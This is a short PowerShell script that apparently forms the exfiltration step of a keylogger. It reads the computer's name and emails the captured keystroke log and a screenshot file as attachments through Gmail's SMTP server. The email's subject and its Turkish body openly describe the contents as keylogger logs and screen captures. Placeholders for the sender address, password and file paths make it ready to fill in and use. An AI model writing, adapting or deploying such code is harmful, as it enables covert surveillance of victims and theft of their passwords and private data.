$Date = get-date
$Name = (Get-WmiObject Win32_Computersystem).name
$From = "<your_email>"
$To = "<your_email>"
$Subject = "Keylogger - $Date"
$Body =  "$Date Tarihinde $Name adli cihazda Keylogger'in tuttugu Loglar ve Ekran Goruntuleri Ektedir"

$FileAttach = "<Your File Path>"
$FileAttach2 = "<your ss file path>"

$SMTPServer = "smtp.gmail.com"
$SMTPClient = new-object Net.Mail.SmtpClient($SMTPServer,587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("<your_email>","<password>");
$Attachment = new-object Net.Mail.Attachment($FileAttach)
$Attachment2 = new-object Net.Mail.Attachment($FileAttach2)

$MSG = new-object Net.Mail.MailMessage($From, $To, $Subject, $Body)
$MSG.attachments.add($Attachment)
$MSG.attachments.add($Attachment2)
$SMTPClient.send($msg)